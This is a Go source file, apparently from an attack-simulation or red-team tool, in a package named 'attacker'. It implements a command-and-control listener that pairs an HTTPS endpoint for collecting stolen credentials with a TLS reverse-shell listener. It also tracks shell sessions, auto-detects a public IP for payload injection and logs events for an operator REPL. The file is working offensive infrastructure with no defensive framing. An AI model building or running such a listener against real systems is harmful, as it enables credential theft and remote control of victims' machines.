// Unless explicitly stated otherwise all files in this repository are licensed under the Apache-2.0 License.
// This product includes software developed at Datadog (https://www.datadoghq.com/)
// Copyright 2026 Datadog, Inc.

package attacker

import (
	"context"
	"crypto/tls"
	"fmt"
	"net"
	"net/http"
	"sync"
	"time"
)

// ListenerConfig holds configuration for the unified listener.
type ListenerConfig struct {
	HTTPSPort int    // Credential collection port (default 8443)
	ShellPort int    // Reverse shell port (default 4444)
	BindAddr  string // Bind address (default 0.0.0.0)
	PublicIP string // Public IP for payload injection (auto-detected or manual)
}

// ListenerStats tracks listener activity.
type ListenerStats struct {
	CredsReceived  int
	ShellSessions  int
	ActiveSessions int
}

// UnifiedListener manages both the HTTPS credential collector and the TLS
// shell listener as a single unit. Start/stop controls both ports together.
type UnifiedListener struct {
	config         ListenerConfig
	cert           tls.Certificate
	httpServer     *http.Server
	shellListener  net.Listener
	SessionManager *ShellSessionManager
	running        bool
	mu             sync.RWMutex
	stats          ListenerStats

	// OnCredReceived is called when credentials arrive at the /collect endpoint.
	// Set this before calling Start() to wire into the identity manager.
	OnCredReceived func(ReceivedCredentials)

	// OnShellConnected is called when a reverse shell connection arrives.
	// The session is stored in the SessionManager; the callback is for notification only.
	OnShellConnected func(session *ShellSession)

	// OnEvent is called for every listener event (connections, errors, etc).
	// Set this before calling Start() to display events in the REPL.
	OnEvent func(ListenerEvent)

	// eventLog writes events to disk for historical review
	eventLog *ListenerEventLog

	// stopAccept signals the shell accept loop to stop
	stopAccept chan struct{}
}

// DefaultListenerConfig returns a ListenerConfig with sensible defaults.
func DefaultListenerConfig() ListenerConfig {
	return ListenerConfig{
		HTTPSPort: 8443,
		ShellPort: 4444,
		BindAddr:  "0.0.0.0",
	}
}

// NewUnifiedListener creates a new listener with the given config.
// Does not start listening -- call Start() for that.
func NewUnifiedListener(config ListenerConfig) *UnifiedListener {
	return &UnifiedListener{
		config:         config,
		stopAccept:     make(chan struct{}),
		SessionManager: NewShellSessionManager(),
	}
}

// Start generates a TLS cert and begins listening on both ports.
func (l *UnifiedListener) Start() error {
	l.mu.Lock()
	defer l.mu.Unlock()

	if l.running {
		return fmt.Errorf("listener is already running")
	}

	// Auto-detect public IP if not set
	if l.config.PublicIP == "" {
		ip, err := DetectPublicIP()
		if err != nil {
			fmt.Printf("[!] %v\n", err)
		} else {
			l.config.PublicIP = ip
		}
	}

	// Generate self-signed TLS certificate
	cert, err := GenerateSelfSignedCert(l.config.PublicIP)
	if err != nil {
		return fmt.Errorf("failed to generate TLS certificate: %v", err)
	}
	l.cert = cert

	// Initialize event log
	eventLog, err := NewListenerEventLog()
	if err != nil {
		fmt.Printf("[!] Could not open listener log: %v (events will not be persisted)\n", err)
	}
	l.eventLog = eventLog

	// Start HTTPS credential collector
	httpsAddr := fmt.Sprintf("%s:%d", l.config.BindAddr, l.config.HTTPSPort)
	handler := credentialsHandler(l.handleCredentials, l.emitEvent)

	tlsConfig := &tls.Config{
		Certificates: []tls.Certificate{l.cert},
		MinVersion:   tls.VersionTLS12,
	}

	l.httpServer = &http.Server{
		Addr:      httpsAddr,
		Handler:   handler,
		TLSConfig: tlsConfig,
	}

	// Start HTTPS server in background
	httpsListener, err := tls.Listen("tcp", httpsAddr, tlsConfig)
	if err != nil {
		return fmt.Errorf("failed to start HTTPS listener on %s: %v", httpsAddr, err)
	}

	go func() {
		if err := l.httpServer.Serve(httpsListener); err != nil && err != http.ErrServerClosed {
			fmt.Printf("[!] HTTPS server error: %v\n", err)
		}
	}()

	// Start TLS shell listener
	shellAddr := fmt.Sprintf("%s:%d", l.config.BindAddr, l.config.ShellPort)
	shellListener, err := newShellListener(shellAddr, l.cert)
	if err != nil {
		// Clean up HTTPS server if shell listener fails
		_ = l.httpServer.Close()
		return err
	}
	l.shellListener = shellListener

	// Accept shell connections in background
	l.stopAccept = make(chan struct{})
	go l.acceptLoop()

	l.running = true
	return nil
}

// Stop shuts down both listeners and closes any active shell session.
func (l *UnifiedListener) Stop() error {
	l.mu.Lock()
	defer l.mu.Unlock()

	if !l.running {
		return nil
	}

	// Signal accept loop to stop
	close(l.stopAccept)

	// Close all shell sessions
	for _, session := range l.SessionManager.List() {
		session.Close()
	}

	// Shut down HTTPS server
	if l.httpServer != nil {
		ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
		defer cancel()
		_ = l.httpServer.Shutdown(ctx)
	}

	// Close shell listener
	if l.shellListener != nil {
		_ = l.shellListener.Close()
	}

	// Close event log
	if l.eventLog != nil {
		l.eventLog.Close()
		l.eventLog = nil
	}

	l.running = false
	return nil
}

// IsRunning returns whether the listener is currently active.
func (l *UnifiedListener) IsRunning() bool {
	l.mu.RLock()
	defer l.mu.RUnlock()
	return l.running
}

// GetConfig returns the current listener configuration.
func (l *UnifiedListener) GetConfig() ListenerConfig {
	l.mu.RLock()
	defer l.mu.RUnlock()
	return l.config
}

// GetStats returns current listener statistics.
func (l *UnifiedListener) GetStats() ListenerStats {
	l.mu.RLock()
	defer l.mu.RUnlock()
	return l.stats
}

// GetSessionManager returns the shell session manager.
func (l *UnifiedListener) GetSessionManager() *ShellSessionManager {
	return l.SessionManager
}

// emitEvent sends an event to the REPL callback and writes it to the log file.
func (l *UnifiedListener) emitEvent(event ListenerEvent) {
	if event.Timestamp.IsZero() {
		event.Timestamp = time.Now()
	}

	// Write to disk log
	if l.eventLog != nil {
		l.eventLog.Write(event)
	}

	// Notify REPL for inline display
	if l.OnEvent != nil {
		l.OnEvent(event)
	}
}

// handleCredentials is the internal callback wired to the HTTPS handler.
func (l *UnifiedListener) handleCredentials(creds ReceivedCredentials) {
	l.mu.Lock()
	l.stats.CredsReceived++
	l.mu.Unlock()

	if l.OnCredReceived != nil {
		l.OnCredReceived(creds)
	}
}

// acceptLoop continuously accepts shell connections until stopped.
func (l *UnifiedListener) acceptLoop() {
	for {
		select {
		case <-l.stopAccept:
			return
		default:
		}

		session, err := acceptShellConnection(l.shellListener)
		if err != nil {
			// Check if we were asked to stop
			select {
			case <-l.stopAccept:
				return
			default:
				// Only log if it's not a closed listener error
				if opErr, ok := err.(*net.OpError); ok && opErr.Err.Error() == "use of closed network connection" {
					return
				}
				fmt.Printf("[!] Shell accept error: %v\n", err)
				continue
			}
		}

		// Register the session and assign an ID
		sessionID := l.SessionManager.Add(session)

		l.mu.Lock()
		l.stats.ShellSessions++
		l.stats.ActiveSessions = l.SessionManager.ActiveCount()
		l.mu.Unlock()

		l.emitEvent(ListenerEvent{
			Type:     EventShellConnect,
			SourceIP: session.SourceIP(),
			Message:  fmt.Sprintf("Session %d opened - reverse shell from %s", sessionID, session.SourceIP()),
		})

		if l.OnShellConnected != nil {
			l.OnShellConnected(session)
		}

		// Watch for session death and update stats
		go func(s *ShellSession, id int) {
			<-s.Done()
			l.mu.Lock()
			l.stats.ActiveSessions = l.SessionManager.ActiveCount()
			l.mu.Unlock()

			l.SessionManager.Remove(id)

			l.emitEvent(ListenerEvent{
				Type:     EventShellDisconnect,
				SourceIP: s.SourceIP(),
				Message:  fmt.Sprintf("Session %d closed - %s disconnected", id, s.SourceIP()),
			})
		}(session, sessionID)
	}
}
